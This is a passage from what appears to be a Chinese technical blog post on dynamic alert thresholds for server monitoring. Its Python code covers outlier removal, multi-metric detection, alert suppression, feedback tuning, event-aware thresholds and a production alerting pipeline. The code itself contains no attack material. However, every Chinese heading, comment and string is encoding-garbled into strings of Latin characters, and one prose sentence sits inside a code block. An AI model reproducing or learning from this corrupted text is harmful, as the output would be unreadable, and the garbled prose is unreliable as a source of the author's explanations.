    <span class="hljs-keyword">else</span>:
        <span class="hljs-keyword">return</span> <span class="hljs-number">24</span>  <span class="hljs-comment"># é»˜è®¤24å°æ—¶</span>
</code></pre>
<h3 data-id="heading-14">3.3.3 å¼‚å¸¸å€¼çš„é²æ£’å¤„ç†</h3>
<p>é—®é¢˜ï¼šå†å²æ•°æ®ä¸­çš„å¼‚å¸¸å€¼ä¼šæ±¡æŸ“æ¨¡å‹</p>
<p>è§£å†³æ–¹æ¡ˆï¼šä½¿ç”¨MADï¼ˆMedian Absolute Deviationï¼‰æ–¹æ³•</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">robust_outlier_removal</span>(<span class="hljs-params">values</span>):
    <span class="hljs-string">"""é²æ£’çš„å¼‚å¸¸å€¼ç§»é™¤"""</span>
    median = np.median(values)
    mad = np.median(np.<span class="hljs-built_in">abs</span>(values - median))
    
    <span class="hljs-comment"># MADæ ‡å‡†åŒ–</span>
    modified_z_scores = <span class="hljs-number">0.6745</span> * (values - median) / mad
    
    <span class="hljs-comment"># æ ‡è®°å¼‚å¸¸å€¼ï¼ˆ|z| &gt; 3.5ï¼‰</span>
    outliers = np.<span class="hljs-built_in">abs</span>(modified_z_scores) &gt; <span class="hljs-number">3.5</span>
    
    <span class="hljs-comment"># ç”¨ä¸­ä½æ•°æ›¿æ¢å¼‚å¸¸å€¼</span>
    cleaned_values = values.copy()
    cleaned_values[outliers] = median
    
    <span class="hljs-keyword">return</span> cleaned_values, outliers
</code></pre>
<h2 data-id="heading-15">å››ã€è¿›é˜¶ä¼˜åŒ–ï¼šä»"èƒ½ç”¨"åˆ°"å¥½ç”¨"</h2>
<h3 data-id="heading-16">4.1 å¤šæŒ‡æ ‡è”åˆåˆ¤æ–­</h3>
<pre><code class="hljs language-python" lang="python">å•ä¸€æŒ‡æ ‡çš„å‘Šè­¦å®¹æ˜“è¯¯åˆ¤ï¼Œç»“åˆå¤šä¸ªç›¸å…³æŒ‡æ ‡å¯ä»¥æé«˜å‡†ç¡®æ€§ï¼š
<span class="hljs-keyword">class</span> <span class="hljs-title class_">MultiMetricAnomalyDetector</span>:
    <span class="hljs-string">"""å¤šæŒ‡æ ‡è”åˆå¼‚å¸¸æ£€æµ‹"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.detectors = {
            <span class="hljs-string">'cpu'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'memory'</span>: DynamicThresholdGenerator(),
            <span class="hljs-string">'response_time'</span>: DynamicThresholdGenerator()
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">detect</span>(<span class="hljs-params">self, metrics, timestamp</span>):
        <span class="hljs-string">"""
        è”åˆæ£€æµ‹é€»è¾‘ï¼š
        1. å•æŒ‡æ ‡å¼‚å¸¸ + ä½ç½®ä¿¡åº¦ â†’ ä¸å‘Šè­¦
        2. å¤šæŒ‡æ ‡åŒæ—¶å¼‚å¸¸ â†’ é«˜ä¼˜å…ˆçº§å‘Šè­¦
        3. å…³è”æŒ‡æ ‡å¼‚å¸¸ â†’ æ ¹å› åˆ†æ
        """</span>
        results = {}
        <span class="hljs-keyword">for</span> metric_name, value <span class="hljs-keyword">in</span> metrics.items():
            results[metric_name] = self.detectors[metric_name].update_and_get_thresholds(
                value, timestamp
            )
        
        <span class="hljs-comment"># è®¡ç®—è”åˆå‘Šè­¦åˆ†æ•°</span>
        alert_score = <span class="hljs-number">0</span>
        <span class="hljs-keyword">for</span> metric, result <span class="hljs-keyword">in</span> results.items():
            <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
                alert_score += result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># å‘Šè­¦å†³ç­–</span>
        <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">1.5</span>:  <span class="hljs-comment"># è‡³å°‘2ä¸ªé«˜ç½®ä¿¡åº¦æŒ‡æ ‡å¼‚å¸¸</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">True</span>,
                <span class="hljs-string">'severity'</span>: <span class="hljs-string">'critical'</span> <span class="hljs-keyword">if</span> alert_score &gt; <span class="hljs-number">2.5</span> <span class="hljs-keyword">else</span> <span class="hljs-string">'warning'</span>,
                <span class="hljs-string">'details'</span>: results,
                <span class="hljs-string">'root_cause'</span>: self._analyze_root_cause(results)
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'is_alert'</span>: <span class="hljs-literal">False</span>}
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_analyze_root_cause</span>(<span class="hljs-params">self, results</span>):
        <span class="hljs-string">"""ç®€å•çš„æ ¹å› åˆ†æ"""</span>
        <span class="hljs-keyword">if</span> results[<span class="hljs-string">'cpu'</span>][<span class="hljs-string">'is_alert'</span>] <span class="hljs-keyword">and</span> results[<span class="hljs-string">'response_time'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'CPUç“¶é¢ˆå¯¼è‡´å“åº”æ—¶é—´ä¸Šå‡'</span>
        <span class="hljs-keyword">elif</span> results[<span class="hljs-string">'memory'</span>][<span class="hljs-string">'is_alert'</span>]:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'å†…å­˜æ³„æ¼æˆ–å†…å­˜ä¸è¶³'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'æœªçŸ¥åŸå› '</span>
</code></pre>
<h3 data-id="heading-17">4.2 å‘Šè­¦æŠ‘åˆ¶ä¸èšåˆ</h3>
<p>é—®é¢˜ï¼šå³ä½¿æ˜¯åŠ¨æ€é˜ˆå€¼ï¼ŒçŸ­æ—¶é—´å†…ä»å¯èƒ½äº§ç”Ÿå¤§é‡é‡å¤å‘Šè­¦</p>
<p>è§£å†³æ–¹æ¡ˆï¼šå®ç°æ™ºèƒ½å‘Šè­¦æŠ‘åˆ¶</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AlertSuppressor</span>:
    <span class="hljs-string">"""å‘Šè­¦æŠ‘åˆ¶å™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, 
                 cooldown_period=<span class="hljs-number">300</span>,      <span class="hljs-comment"># 5åˆ†é’Ÿå†·å´æœŸ</span>
                 aggregation_window=<span class="hljs-number">60</span></span>):   <span class="hljs-comment"># 1åˆ†é’Ÿèšåˆçª—å£</span>
        self.cooldown_period = cooldown_period
        self.aggregation_window = aggregation_window
        self.last_alert_time = {}
        self.pending_alerts = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">should_alert</span>(<span class="hljs-params">self, metric_name, current_time</span>):
        <span class="hljs-string">"""åˆ¤æ–­æ˜¯å¦åº”è¯¥å‘é€å‘Šè­¦"""</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.last_alert_time:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        
        time_since_last = (current_time - self.last_alert_time[metric_name]).total_seconds()
        
        <span class="hljs-keyword">if</span> time_since_last &lt; self.cooldown_period:
            <span class="hljs-comment"># åœ¨å†·å´æœŸå†…ï¼Œä¸å‘é€å‘Šè­¦</span>
            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
        <span class="hljs-keyword">else</span>:
            self.last_alert_time[metric_name] = current_time
            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">aggregate_alerts</span>(<span class="hljs-params">self, alerts</span>):
        <span class="hljs-string">"""èšåˆç›¸ä¼¼å‘Šè­¦"""</span>
        <span class="hljs-comment"># æŒ‰æŒ‡æ ‡ç±»å‹å’Œå‘Šè­¦ç±»å‹åˆ†ç»„</span>
        grouped = {}
        <span class="hljs-keyword">for</span> alert <span class="hljs-keyword">in</span> alerts:
            key = (alert[<span class="hljs-string">'metric'</span>], alert[<span class="hljs-string">'alert_type'</span>])
            <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> grouped:
                grouped[key] = []
            grouped[key].append(alert)
        
        <span class="hljs-comment"># ç”Ÿæˆèšåˆå‘Šè­¦</span>
        aggregated = []
        <span class="hljs-keyword">for</span> key, alert_list <span class="hljs-keyword">in</span> grouped.items():
            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(alert_list) &gt; <span class="hljs-number">1</span>:
                aggregated.append({
                    <span class="hljs-string">'metric'</span>: key[<span class="hljs-number">0</span>],
                    <span class="hljs-string">'alert_type'</span>: key[<span class="hljs-number">1</span>],
                    <span class="hljs-string">'count'</span>: <span class="hljs-built_in">len</span>(alert_list),
                    <span class="hljs-string">'first_occurrence'</span>: alert_list[<span class="hljs-number">0</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'last_occurrence'</span>: alert_list[-<span class="hljs-number">1</span>][<span class="hljs-string">'timestamp'</span>],
                    <span class="hljs-string">'severity'</span>: <span class="hljs-built_in">max</span>(a[<span class="hljs-string">'severity'</span>] <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> alert_list),
                    <span class="hljs-string">'summary'</span>: <span class="hljs-string">f"<span class="hljs-subst">{key[<span class="hljs-number">0</span>]}</span>åœ¨è¿‡å»<span class="hljs-subst">{self.aggregation_window}</span>ç§’å†…è§¦å‘<span class="hljs-subst">{<span class="hljs-built_in">len</span>(alert_list)}</span>æ¬¡<span class="hljs-subst">{key[<span class="hljs-number">1</span>]}</span>å‘Šè­¦"</span>
                })
            <span class="hljs-keyword">else</span>:
                aggregated.append(alert_list[<span class="hljs-number">0</span>])
        
        <span class="hljs-keyword">return</span> aggregated
</code></pre>
<h3 data-id="heading-18">4.3 è‡ªé€‚åº”å­¦ä¹ ä¸åé¦ˆæœºåˆ¶</h3>
<p>æ ¸å¿ƒæ€æƒ³ï¼šä»è¿ç»´äººå‘˜çš„åé¦ˆä¸­å­¦ä¹ ï¼ŒæŒç»­ä¼˜åŒ–é˜ˆå€¼</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">AdaptiveLearningSystem</span>:
    <span class="hljs-string">"""è‡ªé€‚åº”å­¦ä¹ ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, threshold_generator</span>):
        self.threshold_gen = threshold_generator
        self.feedback_history = []
        self.false_positive_count = <span class="hljs-number">0</span>
        self.true_positive_count = <span class="hljs-number">0</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">record_feedback</span>(<span class="hljs-params">self, alert_id, is_true_positive</span>):
        <span class="hljs-string">"""è®°å½•è¿ç»´äººå‘˜çš„åé¦ˆ"""</span>
        self.feedback_history.append({
            <span class="hljs-string">'alert_id'</span>: alert_id,
            <span class="hljs-string">'is_true_positive'</span>: is_true_positive,
            <span class="hljs-string">'timestamp'</span>: datetime.now()
        })
        
        <span class="hljs-keyword">if</span> is_true_positive:
            self.true_positive_count += <span class="hljs-number">1</span>
        <span class="hljs-keyword">else</span>:
            self.false_positive_count += <span class="hljs-number">1</span>
            <span class="hljs-comment"># è¯¯æŠ¥ï¼šæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_adjust_threshold</span>(<span class="hljs-params">self, direction=<span class="hljs-string">'relax'</span></span>):
        <span class="hljs-string">"""åŠ¨æ€è°ƒæ•´sigmaå€æ•°"""</span>
        current_sigma = self.threshold_gen.sigma_multiplier
        
        <span class="hljs-keyword">if</span> direction == <span class="hljs-string">'relax'</span>:
            <span class="hljs-comment"># è¯¯æŠ¥ç‡é«˜ï¼šå¢åŠ sigmaå€æ•°ï¼ˆæ”¾å®½é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">min</span>(current_sigma * <span class="hljs-number">1.1</span>, <span class="hljs-number">5.0</span>)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æ¼æŠ¥ç‡é«˜ï¼šå‡å°‘sigmaå€æ•°ï¼ˆæ”¶ç´§é˜ˆå€¼ï¼‰</span>
            new_sigma = <span class="hljs-built_in">max</span>(current_sigma * <span class="hljs-number">0.9</span>, <span class="hljs-number">2.0</span>)
        
        self.threshold_gen.sigma_multiplier = new_sigma
        
        logging.info(<span class="hljs-string">f"é˜ˆå€¼è°ƒæ•´: <span class="hljs-subst">{current_sigma:<span class="hljs-number">.2</span>f}</span> â†’ <span class="hljs-subst">{new_sigma:<span class="hljs-number">.2</span>f}</span>"</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_accuracy_metrics</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è®¡ç®—å‡†ç¡®ç‡æŒ‡æ ‡"""</span>
        total = self.true_positive_count + self.false_positive_count
        <span class="hljs-keyword">if</span> total == <span class="hljs-number">0</span>:
            <span class="hljs-keyword">return</span> {<span class="hljs-string">'precision'</span>: <span class="hljs-number">0.0</span>, <span class="hljs-string">'feedback_count'</span>: <span class="hljs-number">0</span>}
        
        precision = self.true_positive_count / total
        
        <span class="hljs-keyword">return</span> {
            <span class="hljs-string">'precision'</span>: <span class="hljs-built_in">round</span>(precision, <span class="hljs-number">3</span>),
            <span class="hljs-string">'true_positives'</span>: self.true_positive_count,
            <span class="hljs-string">'false_positives'</span>: self.false_positive_count,
            <span class="hljs-string">'feedback_count'</span>: total
        }
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">auto_tune</span>(<span class="hljs-params">self</span>):
        <span class="hljs-string">"""è‡ªåŠ¨è°ƒä¼˜"""</span>
        metrics = self.get_accuracy_metrics()
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'feedback_count'</span>] &lt; <span class="hljs-number">20</span>:
            <span class="hljs-comment"># åé¦ˆæ ·æœ¬ä¸è¶³ï¼Œä¸è¿›è¡Œè°ƒæ•´</span>
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-keyword">if</span> metrics[<span class="hljs-string">'precision'</span>] &lt; <span class="hljs-number">0.5</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡ä½äº50%ï¼Œæ”¾å®½é˜ˆå€¼</span>
            self._adjust_threshold(direction=<span class="hljs-string">'relax'</span>)
        <span class="hljs-keyword">elif</span> metrics[<span class="hljs-string">'precision'</span>] &gt; <span class="hljs-number">0.9</span>:
            <span class="hljs-comment"># å‡†ç¡®ç‡å¾ˆé«˜ï¼Œå¯ä»¥é€‚å½“æ”¶ç´§é˜ˆå€¼ä»¥æé«˜æ•æ„Ÿåº¦</span>
            self._adjust_threshold(direction=<span class="hljs-string">'tighten'</span>)
</code></pre>
<h3 data-id="heading-19">4.4 ç‰¹æ®Šåœºæ™¯å¤„ç†</h3>
<h3 data-id="heading-20">4.4.1 ä¿ƒé”€æ´»åŠ¨ç­‰å·²çŸ¥äº‹ä»¶</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">EventAwareThresholdGenerator</span>(<span class="hljs-title class_ inherited__">DynamicThresholdGenerator</span>):
    <span class="hljs-string">"""äº‹ä»¶æ„ŸçŸ¥çš„é˜ˆå€¼ç”Ÿæˆå™¨"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, *args, **kwargs</span>):
        <span class="hljs-built_in">super</span>().__init__(*args, **kwargs)
        self.scheduled_events = []
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">register_event</span>(<span class="hljs-params">self, event_name, start_time, end_time, expected_multiplier</span>):
        <span class="hljs-string">"""
        æ³¨å†Œå·²çŸ¥äº‹ä»¶
        
        Args:
            event_name: äº‹ä»¶åç§°ï¼ˆå¦‚"åŒ11ä¿ƒé”€"ï¼‰
            start_time: å¼€å§‹æ—¶é—´
            end_time: ç»“æŸæ—¶é—´
            expected_multiplier: é¢„æœŸè´Ÿè½½å€æ•°ï¼ˆå¦‚3.0è¡¨ç¤º3å€è´Ÿè½½ï¼‰
        """</span>
        self.scheduled_events.append({
            <span class="hljs-string">'name'</span>: event_name,
            <span class="hljs-string">'start'</span>: start_time,
            <span class="hljs-string">'end'</span>: end_time,
            <span class="hljs-string">'multiplier'</span>: expected_multiplier
        })
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_dynamic_thresholds</span>(<span class="hljs-params">self, decomposition</span>):
        <span class="hljs-string">"""é‡å†™é˜ˆå€¼è®¡ç®—ï¼Œè€ƒè™‘å·²çŸ¥äº‹ä»¶"""</span>
        base_thresholds = <span class="hljs-built_in">super</span>()._calculate_dynamic_thresholds(decomposition)
        
        <span class="hljs-comment"># æ£€æŸ¥å½“å‰æ˜¯å¦åœ¨äº‹ä»¶æœŸé—´</span>
        current_time = datetime.now()
        <span class="hljs-keyword">for</span> event <span class="hljs-keyword">in</span> self.scheduled_events:
            <span class="hljs-keyword">if</span> event[<span class="hljs-string">'start'</span>] &lt;= current_time &lt;= event[<span class="hljs-string">'end'</span>]:
                <span class="hljs-comment"># åœ¨äº‹ä»¶æœŸé—´ï¼Œæ”¾å®½ä¸Šç•Œ</span>
                multiplier = event[<span class="hljs-string">'multiplier'</span>]
                base_thresholds[<span class="hljs-string">'upper'</span>] *= multiplier
                base_thresholds[<span class="hljs-string">'expected'</span>] *= multiplier
                
                logging.info(<span class="hljs-string">f"æ£€æµ‹åˆ°äº‹ä»¶'<span class="hljs-subst">{event[<span class="hljs-string">'name'</span>]}</span>'ï¼Œé˜ˆå€¼å·²è°ƒæ•´"</span>)
                <span class="hljs-keyword">break</span>
        
        <span class="hljs-keyword">return</span> base_thresholds
</code></pre>
<p>4.4.2 å†·å¯åŠ¨é—®é¢˜</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ColdStartHandler</span>:
    <span class="hljs-string">"""å†·å¯åŠ¨å¤„ç†å™¨"""</span>
    
<span class="hljs-meta">    @staticmethod</span>
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_initial_thresholds</span>(<span class="hljs-params">metric_type, percentile=<span class="hljs-number">95</span></span>):
        <span class="hljs-string">"""
        åŸºäºå†å²ç»Ÿè®¡æ•°æ®çš„åˆå§‹é˜ˆå€¼
        
        Args:
            metric_type: æŒ‡æ ‡ç±»å‹ï¼ˆcpu/memory/diskç­‰ï¼‰
            percentile: ç™¾åˆ†ä½æ•°
        """</span>
        <span class="hljs-comment"># ä»å†å²æ•°æ®åº“åŠ è½½åŒç±»å‹æœåŠ¡çš„ç»Ÿè®¡æ•°æ®</span>
        historical_stats = {
            <span class="hljs-string">'cpu'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">45</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">75</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">85</span>},
            <span class="hljs-string">'memory'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">60</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">80</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">90</span>},
            <span class="hljs-string">'response_time'</span>: {<span class="hljs-string">'p50'</span>: <span class="hljs-number">100</span>, <span class="hljs-string">'p95'</span>: <span class="hljs-number">500</span>, <span class="hljs-string">'p99'</span>: <span class="hljs-number">1000</span>}
        }
        
        <span class="hljs-keyword">if</span> metric_type <span class="hljs-keyword">in</span> historical_stats:
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: historical_stats[metric_type][<span class="hljs-string">'p95'</span>],
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.3</span>  <span class="hljs-comment"># ä½ç½®ä¿¡åº¦</span>
            }
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># æœªçŸ¥æŒ‡æ ‡ç±»å‹ï¼Œä½¿ç”¨ä¿å®ˆé˜ˆå€¼</span>
            <span class="hljs-keyword">return</span> {
                <span class="hljs-string">'upper'</span>: <span class="hljs-built_in">float</span>(<span class="hljs-string">'inf'</span>),
                <span class="hljs-string">'lower'</span>: <span class="hljs-number">0</span>,
                <span class="hljs-string">'confidence'</span>: <span class="hljs-number">0.0</span>
            }
</code></pre>
<h2 data-id="heading-21">äº”ã€ç”Ÿäº§ç¯å¢ƒéƒ¨ç½²å®è·µ</h2>
<h3 data-id="heading-22">5.1 ç³»ç»Ÿé›†æˆæ¶æ„</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductionAlertingSystem</span>:
    <span class="hljs-string">"""ç”Ÿäº§çº§å‘Šè­¦ç³»ç»Ÿ"""</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, config</span>):
        <span class="hljs-comment"># æ ¸å¿ƒç»„ä»¶</span>
        self.threshold_generators = {}
        self.alert_suppressor = AlertSuppressor()
        self.learning_system = AdaptiveLearningSystem(<span class="hljs-literal">None</span>)
        self.multi_metric_detector = MultiMetricAnomalyDetector()
        
        <span class="hljs-comment"># æ•°æ®å­˜å‚¨</span>
        self.timeseries_db = InfluxDBClient(config[<span class="hljs-string">'influxdb'</span>])
        self.alert_db = PostgreSQLClient(config[<span class="hljs-string">'postgres'</span>])
        
        <span class="hljs-comment"># å‘Šè­¦é€šé“</span>
        self.notifiers = {
            <span class="hljs-string">'dingtalk'</span>: DingTalkNotifier(config[<span class="hljs-string">'dingtalk_webhook'</span>]),
            <span class="hljs-string">'email'</span>: EmailNotifier(config[<span class="hljs-string">'smtp'</span>]),
            <span class="hljs-string">'pagerduty'</span>: PagerDutyNotifier(config[<span class="hljs-string">'pagerduty_key'</span>])
        }
        
        <span class="hljs-comment"># é…ç½®</span>
        self.config = config
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">process_metric</span>(<span class="hljs-params">self, metric_name, value, timestamp, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å•ä¸ªæŒ‡æ ‡"""</span>
        <span class="hljs-comment"># 1. è·å–æˆ–åˆ›å»ºé˜ˆå€¼ç”Ÿæˆå™¨</span>
        <span class="hljs-keyword">if</span> metric_name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self.threshold_generators:
            self.threshold_generators[metric_name] = self._create_threshold_generator(
                metric_name, metadata
            )
        
        generator = self.threshold_generators[metric_name]
        
        <span class="hljs-comment"># 2. è®¡ç®—åŠ¨æ€é˜ˆå€¼</span>
        result = generator.update_and_get_thresholds(value, timestamp)
        
        <span class="hljs-comment"># 3. å­˜å‚¨ç»“æœåˆ°æ—¶åºæ•°æ®åº“</span>
        self._store_threshold_data(metric_name, result)
        
        <span class="hljs-comment"># 4. å¦‚æœè§¦å‘å‘Šè­¦ï¼Œè¿›è¡Œåç»­å¤„ç†</span>
        <span class="hljs-keyword">if</span> result[<span class="hljs-string">'is_alert'</span>]:
            self._handle_alert(metric_name, result, metadata)
        
        <span class="hljs-keyword">return</span> result
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_create_threshold_generator</span>(<span class="hljs-params">self, metric_name, metadata</span>):
        <span class="hljs-string">"""æ ¹æ®æŒ‡æ ‡ç±»å‹åˆ›å»ºåˆé€‚çš„ç”Ÿæˆå™¨"""</span>
        metric_config = self.config[<span class="hljs-string">'metrics'</span>].get(
            metadata.get(<span class="hljs-string">'type'</span>, <span class="hljs-string">'default'</span>),
            self.config[<span class="hljs-string">'metrics'</span>][<span class="hljs-string">'default'</span>]
        )
        
        <span class="hljs-keyword">if</span> metadata.get(<span class="hljs-string">'has_scheduled_events'</span>):
            <span class="hljs-keyword">return</span> EventAwareThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> DynamicThresholdGenerator(
                window_size=metric_config[<span class="hljs-string">'window_size'</span>],
                seasonal_period=metric_config[<span class="hljs-string">'seasonal_period'</span>]
            )
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_handle_alert</span>(<span class="hljs-params">self, metric_name, result, metadata</span>):
        <span class="hljs-string">"""å¤„ç†å‘Šè­¦"""</span>
        <span class="hljs-comment"># 1. å‘Šè­¦æŠ‘åˆ¶æ£€æŸ¥</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.alert_suppressor.should_alert(metric_name, result[<span class="hljs-string">'timestamp'</span>]):
            logging.info(<span class="hljs-string">f"å‘Šè­¦è¢«æŠ‘åˆ¶: <span class="hljs-subst">{metric_name}</span>"</span>)
            <span class="hljs-keyword">return</span>
        
        <span class="hljs-comment"># 2. æ„å»ºå‘Šè­¦å¯¹è±¡</span>
        alert = {
            <span class="hljs-string">'id'</span>: self._generate_alert_id(),
            <span class="hljs-string">'metric'</span>: metric_name,
            <span class="hljs-string">'timestamp'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
            <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
            <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
            <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
            <span class="hljs-string">'deviation'</span>: result[<span class="hljs-string">'deviation_percentage'</span>],
            <span class="hljs-string">'confidence'</span>: result[<span class="hljs-string">'confidence'</span>],
            <span class="hljs-string">'alert_type'</span>: result[<span class="hljs-string">'alert_type'</span>],
            <span class="hljs-string">'severity'</span>: self._calculate_severity(result),
            <span class="hljs-string">'metadata'</span>: metadata
        }
        
        <span class="hljs-comment"># 3. å­˜å‚¨å‘Šè­¦è®°å½•</span>
        self.alert_db.insert_alert(alert)
        
        <span class="hljs-comment"># 4. å‘é€é€šçŸ¥</span>
        self._send_notifications(alert)
        
        <span class="hljs-comment"># 5. è§¦å‘è‡ªåŠ¨åŒ–å“åº”ï¼ˆå¯é€‰ï¼‰</span>
        <span class="hljs-keyword">if</span> self.config.get(<span class="hljs-string">'auto_remediation_enabled'</span>):
            self._trigger_auto_remediation(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_calculate_severity</span>(<span class="hljs-params">self, result</span>):
        <span class="hljs-string">"""è®¡ç®—å‘Šè­¦ä¸¥é‡ç¨‹åº¦"""</span>
        deviation = <span class="hljs-built_in">abs</span>(result[<span class="hljs-string">'deviation_percentage'</span>])
        confidence = result[<span class="hljs-string">'confidence'</span>]
        
        <span class="hljs-comment"># ç»¼åˆåç¦»åº¦å’Œç½®ä¿¡åº¦</span>
        severity_score = deviation * confidence
        
        <span class="hljs-keyword">if</span> severity_score &gt; <span class="hljs-number">100</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'critical'</span>
        <span class="hljs-keyword">elif</span> severity_score &gt; <span class="hljs-number">50</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'warning'</span>
        <span class="hljs-keyword">else</span>:
            <span class="hljs-keyword">return</span> <span class="hljs-string">'info'</span>
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_send_notifications</span>(<span class="hljs-params">self, alert</span>):
        <span class="hljs-string">"""å‘é€å‘Šè­¦é€šçŸ¥"""</span>
        severity = alert[<span class="hljs-string">'severity'</span>]
        
        <span class="hljs-comment"># æ ¹æ®ä¸¥é‡ç¨‹åº¦é€‰æ‹©é€šçŸ¥æ¸ é“</span>
        <span class="hljs-keyword">if</span> severity == <span class="hljs-string">'critical'</span>:
            <span class="hljs-comment"># ä¸¥é‡å‘Šè­¦ï¼šæ‰€æœ‰æ¸ é“</span>
            <span class="hljs-keyword">for</span> notifier <span class="hljs-keyword">in</span> self.notifiers.values():
                notifier.send(alert)
        <span class="hljs-keyword">elif</span> severity == <span class="hljs-string">'warning'</span>:
            <span class="hljs-comment"># è­¦å‘Šï¼šé’‰é’‰ + é‚®ä»¶</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
            self.notifiers[<span class="hljs-string">'email'</span>].send(alert)
        <span class="hljs-keyword">else</span>:
            <span class="hljs-comment"># ä¿¡æ¯ï¼šä»…é’‰é’‰</span>
            self.notifiers[<span class="hljs-string">'dingtalk'</span>].send(alert)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_store_threshold_data</span>(<span class="hljs-params">self, metric_name, result</span>):
        <span class="hljs-string">"""å­˜å‚¨é˜ˆå€¼æ•°æ®åˆ°æ—¶åºæ•°æ®åº“"""</span>
        point = {
            <span class="hljs-string">'measurement'</span>: <span class="hljs-string">'dynamic_thresholds'</span>,
            <span class="hljs-string">'tags'</span>: {
                <span class="hljs-string">'metric'</span>: metric_name
            },
            <span class="hljs-string">'time'</span>: result[<span class="hljs-string">'timestamp'</span>],
            <span class="hljs-string">'fields'</span>: {
                <span class="hljs-string">'current_value'</span>: result[<span class="hljs-string">'current_value'</span>],
                <span class="hljs-string">'expected_value'</span>: result[<span class="hljs-string">'expected_value'</span>],
                <span class="hljs-string">'upper_bound'</span>: result[<span class="hljs-string">'upper_bound'</span>],
                <span class="hljs-string">'lower_bound'</span>: result[<span class="hljs-string">'lower_bound'</span>],
